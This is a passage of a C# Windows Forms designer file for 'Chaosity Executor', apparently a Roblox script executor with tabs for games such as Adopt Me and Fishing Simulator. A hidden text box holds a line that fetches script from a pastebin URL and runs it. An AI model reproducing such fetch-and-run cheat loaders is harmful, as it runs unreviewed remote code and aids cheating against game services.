            this.flatButton463.BackColor = System.Drawing.Color.Transparent;
            this.flatButton463.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton463.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton463.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton463.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton463.Location = new System.Drawing.Point(557, 369);
            this.flatButton463.Name = "flatButton463";
            this.flatButton463.Rounded = false;
            this.flatButton463.Size = new System.Drawing.Size(106, 35);
            this.flatButton463.TabIndex = 23;
            this.flatButton463.Text = "Home";
            this.flatButton463.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton463.UseCustomColor = false;
            this.flatButton463.Click += new System.EventHandler(this.flatButton463_Click);
            // 
            // pictureBox291
            // 
            this.pictureBox291.Location = new System.Drawing.Point(514, 6);
            this.pictureBox291.Name = "pictureBox291";
            this.pictureBox291.Size = new System.Drawing.Size(149, 149);
            this.pictureBox291.TabIndex = 22;
            this.pictureBox291.TabStop = false;
            // 
            // richTextBox106
            // 
            this.richTextBox106.Location = new System.Drawing.Point(6, 47);
            this.richTextBox106.Name = "richTextBox106";
            this.richTextBox106.Size = new System.Drawing.Size(106, 178);
            this.richTextBox106.TabIndex = 21;
            this.richTextBox106.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/mFnVACZ1\",true))()";
            this.richTextBox106.Visible = false;
            // 
            // flatButton464
            // 
            this.flatButton464.BackColor = System.Drawing.Color.Transparent;
            this.flatButton464.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton464.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton464.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton464.Location = new System.Drawing.Point(6, 6);
            this.flatButton464.Name = "flatButton464";
            this.flatButton464.Rounded = false;
            this.flatButton464.Size = new System.Drawing.Size(106, 35);
            this.flatButton464.TabIndex = 20;
            this.flatButton464.Text = "Gui";
            this.flatButton464.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton464.UseCustomColor = false;
            this.flatButton464.Click += new System.EventHandler(this.flatButton464_Click);
            // 
            // tabPage164
            // 
            this.tabPage164.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage164.Controls.Add(this.flatButton471);
            this.tabPage164.Controls.Add(this.pictureBox299);
            this.tabPage164.Controls.Add(this.flatButton472);
            this.tabPage164.Location = new System.Drawing.Point(4, 44);
            this.tabPage164.Name = "tabPage164";
            this.tabPage164.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage164.Size = new System.Drawing.Size(514, 249);
            this.tabPage164.TabIndex = 159;
            this.tabPage164.Text = "SWAT Simulator";
            // 
            // flatButton471
            // 
            this.flatButton471.BackColor = System.Drawing.Color.Transparent;
            this.flatButton471.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton471.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton471.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton471.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton471.Location = new System.Drawing.Point(557, 369);
            this.flatButton471.Name = "flatButton471";
            this.flatButton471.Rounded = false;
            this.flatButton471.Size = new System.Drawing.Size(106, 35);
            this.flatButton471.TabIndex = 26;
            this.flatButton471.Text = "Home";
            this.flatButton471.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton471.UseCustomColor = false;
            this.flatButton471.Click += new System.EventHandler(this.flatButton471_Click);
            // 
            // pictureBox299
            // 
            this.pictureBox299.Location = new System.Drawing.Point(514, 6);
            this.pictureBox299.Name = "pictureBox299";
            this.pictureBox299.Size = new System.Drawing.Size(149, 149);
            this.pictureBox299.TabIndex = 25;
            this.pictureBox299.TabStop = false;
            // 
            // flatButton472
            // 
            this.flatButton472.BackColor = System.Drawing.Color.Transparent;
            this.flatButton472.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton472.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton472.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton472.Location = new System.Drawing.Point(6, 6);
            this.flatButton472.Name = "flatButton472";
            this.flatButton472.Rounded = false;
            this.flatButton472.Size = new System.Drawing.Size(106, 35);
            this.flatButton472.TabIndex = 24;
            this.flatButton472.Text = "Gui";
            this.flatButton472.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton472.UseCustomColor = false;
            this.flatButton472.Click += new System.EventHandler(this.flatButton472_Click);
            // 
            // tabPage165
            // 
            this.tabPage165.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage165.Controls.Add(this.flatButton473);
            this.tabPage165.Controls.Add(this.pictureBox300);
            this.tabPage165.Controls.Add(this.flatButton474);
            this.tabPage165.Location = new System.Drawing.Point(4, 44);
            this.tabPage165.Name = "tabPage165";
            this.tabPage165.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage165.Size = new System.Drawing.Size(514, 249);
            this.tabPage165.TabIndex = 160;
            this.tabPage165.Text = "Fishing Simulator";
            // 
            // flatButton473
            // 
            this.flatButton473.BackColor = System.Drawing.Color.Transparent;
            this.flatButton473.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton473.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton473.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton473.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton473.Location = new System.Drawing.Point(557, 369);
            this.flatButton473.Name = "flatButton473";
            this.flatButton473.Rounded = false;
            this.flatButton473.Size = new System.Drawing.Size(106, 35);
            this.flatButton473.TabIndex = 29;
            this.flatButton473.Text = "Home";
            this.flatButton473.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton473.UseCustomColor = false;
            this.flatButton473.Click += new System.EventHandler(this.flatButton473_Click);
            // 
            // pictureBox300
            // 
            this.pictureBox300.Location = new System.Drawing.Point(514, 6);
            this.pictureBox300.Name = "pictureBox300";
            this.pictureBox300.Size = new System.Drawing.Size(149, 149);
            this.pictureBox300.TabIndex = 28;
            this.pictureBox300.TabStop = false;
            // 
            // flatButton474
            // 
            this.flatButton474.BackColor = System.Drawing.Color.Transparent;
            this.flatButton474.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton474.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton474.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton474.Location = new System.Drawing.Point(6, 6);
            this.flatButton474.Name = "flatButton474";
            this.flatButton474.Rounded = false;
            this.flatButton474.Size = new System.Drawing.Size(106, 35);
            this.flatButton474.TabIndex = 27;
            this.flatButton474.Text = "Gui";
            this.flatButton474.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton474.UseCustomColor = false;
            this.flatButton474.Click += new System.EventHandler(this.flatButton474_Click);
            // 
            // tabPage166
            // 
            this.tabPage166.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage166.Controls.Add(this.flatButton475);
            this.tabPage166.Controls.Add(this.pictureBox301);
            this.tabPage166.Controls.Add(this.flatButton476);
            this.tabPage166.Location = new System.Drawing.Point(4, 44);
            this.tabPage166.Name = "tabPage166";
            this.tabPage166.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage166.Size = new System.Drawing.Size(514, 249);
            this.tabPage166.TabIndex = 161;
            this.tabPage166.Text = "One Piece Awakening";
            // 
            // flatButton475
            // 
            this.flatButton475.BackColor = System.Drawing.Color.Transparent;
            this.flatButton475.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton475.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton475.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton475.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton475.Location = new System.Drawing.Point(557, 369);
            this.flatButton475.Name = "flatButton475";
            this.flatButton475.Rounded = false;
            this.flatButton475.Size = new System.Drawing.Size(106, 35);
            this.flatButton475.TabIndex = 32;
            this.flatButton475.Text = "Home";
            this.flatButton475.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton475.UseCustomColor = false;
            this.flatButton475.Click += new System.EventHandler(this.flatButton475_Click);
            // 
            // pictureBox301
            // 
            this.pictureBox301.Location = new System.Drawing.Point(514, 6);
            this.pictureBox301.Name = "pictureBox301";
            this.pictureBox301.Size = new System.Drawing.Size(149, 149);
            this.pictureBox301.TabIndex = 31;
            this.pictureBox301.TabStop = false;
            // 
            // flatButton476
            // 
            this.flatButton476.BackColor = System.Drawing.Color.Transparent;
            this.flatButton476.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton476.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton476.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton476.Location = new System.Drawing.Point(6, 6);
            this.flatButton476.Name = "flatButton476";
            this.flatButton476.Rounded = false;
            this.flatButton476.Size = new System.Drawing.Size(106, 35);
            this.flatButton476.TabIndex = 30;
            this.flatButton476.Text = "Gui";
            this.flatButton476.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton476.UseCustomColor = false;
            this.flatButton476.Click += new System.EventHandler(this.flatButton476_Click);
            // 
            // tabPage167
            // 
            this.tabPage167.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage167.Controls.Add(this.flatButton477);
            this.tabPage167.Controls.Add(this.pictureBox302);
            this.tabPage167.Controls.Add(this.flatButton478);
            this.tabPage167.Location = new System.Drawing.Point(4, 44);
            this.tabPage167.Name = "tabPage167";
            this.tabPage167.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage167.Size = new System.Drawing.Size(514, 249);
            this.tabPage167.TabIndex = 162;
            this.tabPage167.Text = "2 Player Super Hero Tycoon";
            // 
            // flatButton477
            // 
            this.flatButton477.BackColor = System.Drawing.Color.Transparent;
            this.flatButton477.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton477.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton477.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton477.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton477.Location = new System.Drawing.Point(557, 369);
            this.flatButton477.Name = "flatButton477";
            this.flatButton477.Rounded = false;
            this.flatButton477.Size = new System.Drawing.Size(106, 35);
            this.flatButton477.TabIndex = 35;
            this.flatButton477.Text = "Home";
            this.flatButton477.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton477.UseCustomColor = false;
            this.flatButton477.Click += new System.EventHandler(this.flatButton477_Click);
            // 
            // pictureBox302
            // 
            this.pictureBox302.Location = new System.Drawing.Point(514, 6);
            this.pictureBox302.Name = "pictureBox302";
            this.pictureBox302.Size = new System.Drawing.Size(149, 149);
            this.pictureBox302.TabIndex = 34;
            this.pictureBox302.TabStop = false;
            // 
            // flatButton478
            // 
            this.flatButton478.BackColor = System.Drawing.Color.Transparent;
            this.flatButton478.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton478.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton478.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton478.Location = new System.Drawing.Point(6, 6);
            this.flatButton478.Name = "flatButton478";
            this.flatButton478.Rounded = false;
            this.flatButton478.Size = new System.Drawing.Size(106, 35);
            this.flatButton478.TabIndex = 33;
            this.flatButton478.Text = "Gui";
            this.flatButton478.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton478.UseCustomColor = false;
            this.flatButton478.Click += new System.EventHandler(this.flatButton478_Click);
            // 
            // tabPage168
            // 
            this.tabPage168.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage168.Controls.Add(this.flatButton479);
            this.tabPage168.Controls.Add(this.pictureBox303);
            this.tabPage168.Controls.Add(this.flatButton480);
            this.tabPage168.Location = new System.Drawing.Point(4, 44);
            this.tabPage168.Name = "tabPage168";
            this.tabPage168.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage168.Size = new System.Drawing.Size(514, 249);
            this.tabPage168.TabIndex = 163;
            this.tabPage168.Text = "The Wild West";
            // 
            // flatButton479
            // 
            this.flatButton479.BackColor = System.Drawing.Color.Transparent;
            this.flatButton479.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton479.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton479.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton479.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton479.Location = new System.Drawing.Point(557, 369);
            this.flatButton479.Name = "flatButton479";
            this.flatButton479.Rounded = false;
            this.flatButton479.Size = new System.Drawing.Size(106, 35);
            this.flatButton479.TabIndex = 38;
            this.flatButton479.Text = "Home";
            this.flatButton479.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton479.UseCustomColor = false;
            this.flatButton479.Click += new System.EventHandler(this.flatButton479_Click);
            // 
            // pictureBox303
            // 
            this.pictureBox303.Location = new System.Drawing.Point(514, 6);
            this.pictureBox303.Name = "pictureBox303";
            this.pictureBox303.Size = new System.Drawing.Size(149, 149);
            this.pictureBox303.TabIndex = 37;
            this.pictureBox303.TabStop = false;
            // 
            // flatButton480
            // 
            this.flatButton480.BackColor = System.Drawing.Color.Transparent;
            this.flatButton480.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton480.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton480.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton480.Location = new System.Drawing.Point(6, 6);
            this.flatButton480.Name = "flatButton480";
            this.flatButton480.Rounded = false;
            this.flatButton480.Size = new System.Drawing.Size(106, 35);
            this.flatButton480.TabIndex = 36;
            this.flatButton480.Text = "Gui";
            this.flatButton480.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton480.UseCustomColor = false;
            this.flatButton480.Click += new System.EventHandler(this.flatButton480_Click);
            // 
            // tabPage170
            // 
            this.tabPage170.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage170.Controls.Add(this.flatButton483);
            this.tabPage170.Controls.Add(this.pictureBox305);
            this.tabPage170.Controls.Add(this.flatButton484);
            this.tabPage170.Location = new System.Drawing.Point(4, 44);
            this.tabPage170.Name = "tabPage170";
            this.tabPage170.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage170.Size = new System.Drawing.Size(514, 249);
            this.tabPage170.TabIndex = 165;
            this.tabPage170.Text = "Adopt Me";
            // 
            // flatButton483
            // 
            this.flatButton483.BackColor = System.Drawing.Color.Transparent;
            this.flatButton483.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton483.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton483.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton483.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton483.Location = new System.Drawing.Point(557, 369);
            this.flatButton483.Name = "flatButton483";
            this.flatButton483.Rounded = false;
            this.flatButton483.Size = new System.Drawing.Size(106, 35);
            this.flatButton483.TabIndex = 44;
            this.flatButton483.Text = "Home";
            this.flatButton483.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton483.UseCustomColor = false;
            this.flatButton483.Click += new System.EventHandler(this.flatButton483_Click);
            // 
            // pictureBox305
            // 
            this.pictureBox305.Location = new System.Drawing.Point(514, 6);
            this.pictureBox305.Name = "pictureBox305";
            this.pictureBox305.Size = new System.Drawing.Size(149, 149);
            this.pictureBox305.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox305.TabIndex = 43;
            this.pictureBox305.TabStop = false;
            // 
            // flatButton484
            // 
            this.flatButton484.BackColor = System.Drawing.Color.Transparent;
            this.flatButton484.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton484.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton484.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton484.Location = new System.Drawing.Point(6, 6);
            this.flatButton484.Name = "flatButton484";
            this.flatButton484.Rounded = false;
            this.flatButton484.Size = new System.Drawing.Size(106, 35);
            this.flatButton484.TabIndex = 42;
            this.flatButton484.Text = "Gui";
            this.flatButton484.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton484.UseCustomColor = false;
            this.flatButton484.Click += new System.EventHandler(this.flatButton484_Click);
            // 
            // OMGGameHubMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(523, 344);
            this.Controls.Add(this.From1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "OMGGameHubMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Chaosity Executor";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.OMGGameHubMain_Load);
            this.Leave += new System.EventHandler(this.OMGGameHubMain_Leave);
            this.From1.ResumeLayout(false);
            this.flatTabControl2.ResumeLayout(false);
            this.Executor.ResumeLayout(false);
            this.Main.ResumeLayout(false);
            this.Main.PerformLayout();
            this.tabPage27.ResumeLayout(false);
            this.tabPage30.ResumeLayout(false);
            this.tabPage31.ResumeLayout(false);
            this.tabPage32.ResumeLayout(false);
            this.tabPage33.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox46)).EndInit();
            this.tabPage36.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox58)).EndInit();
            this.tabPage38.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox60)).EndInit();
            this.tabPage45.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox70)).EndInit();
            this.tabPage48.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox78)).EndInit();
            this.tabPage51.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).EndInit();
            this.tabPage52.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox88)).EndInit();
            this.tabPage58.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox94)).EndInit();
            this.tabPage61.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).EndInit();
            this.tabPage64.ResumeLayout(false);
            this.tabPage64.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox106)).EndInit();
            this.tabPage65.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox107)).EndInit();
            this.tabPage66.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox108)).EndInit();
            this.tabPage67.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox109)).EndInit();
            this.tabPage70.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox119)).EndInit();
            this.tabPage72.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox121)).EndInit();
            this.tabPage74.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox123)).EndInit();
            this.tabPage76.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox134)).EndInit();
            this.tabPage77.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox135)).EndInit();
            this.tabPage79.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox137)).EndInit();
            this.tabPage80.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox138)).EndInit();
            this.tabPage81.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox139)).EndInit();
            this.tabPage82.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox140)).EndInit();
            this.tabPage83.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox141)).EndInit();
            this.tabPage86.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox151)).EndInit();
            this.tabPage88.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox153)).EndInit();
            this.tabPage89.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox154)).EndInit();
            this.tabPage90.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox155)).EndInit();
            this.tabPage91.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox156)).EndInit();
            this.tabPage93.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox158)).EndInit();
            this.tabPage94.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).EndInit();
            this.tabPage96.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox167)).EndInit();
            this.tabPage99.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox170)).EndInit();
            this.tabPage103.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox182)).EndInit();
            this.tabPage104.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox183)).EndInit();
            this.tabPage105.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox184)).EndInit();
            this.tabPage107.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox186)).EndInit();
            this.tabPage108.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox187)).EndInit();
            this.tabPage110.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox196)).EndInit();
            this.tabPage111.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox197)).EndInit();
            this.tabPage112.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox198)).EndInit();
            this.tabPage113.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox199)).EndInit();
            this.tabPage117.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox210)).EndInit();
            this.tabPage119.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox212)).EndInit();
            this.tabPage120.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox213)).EndInit();
            this.tabPage122.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox215)).EndInit();
            this.tabPage124.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox217)).EndInit();
            this.tabPage125.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox218)).EndInit();
            this.tabPage126.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox226)).EndInit();
            this.tabPage127.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox227)).EndInit();
            this.tabPage128.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox228)).EndInit();
            this.tabPage129.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox229)).EndInit();
            this.tabPage130.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox230)).EndInit();
            this.tabPage132.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox232)).EndInit();
            this.tabPage136.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox243)).EndInit();
            this.tabPage137.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox244)).EndInit();
            this.tabPage140.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox247)).EndInit();
            this.tabPage141.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox248)).EndInit();
            this.tabPage142.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox249)).EndInit();
            this.tabPage143.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox257)).EndInit();
            this.tabPage144.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox258)).EndInit();
            this.tabPage145.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox259)).EndInit();
            this.tabPage146.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox260)).EndInit();
            this.tabPage147.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox261)).EndInit();
            this.tabPage148.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox262)).EndInit();
            this.tabPage149.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox263)).EndInit();
            this.tabPage150.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox271)).EndInit();
            this.tabPage151.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox272)).EndInit();
            this.tabPage152.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox273)).EndInit();
            this.tabPage153.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox274)).EndInit();
            this.tabPage154.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox275)).EndInit();
            this.tabPage155.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox276)).EndInit();
            this.tabPage156.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox277)).EndInit();
            this.tabPage158.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox33)).EndInit();
            this.tabPage159.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox287)).EndInit();
            this.tabPage160.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox288)).EndInit();
            this.tabPage161.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox289)).EndInit();
            this.tabPage162.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox290)).EndInit();
            this.tabPage163.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox291)).EndInit();
            this.tabPage164.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox299)).EndInit();
            this.tabPage165.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox300)).EndInit();
            this.tabPage166.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox301)).EndInit();
            this.tabPage167.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox302)).EndInit();
            this.tabPage168.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox303)).EndInit();
            this.tabPage170.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox305)).EndInit();
            this.ResumeLayout(false);

    }
  }
}
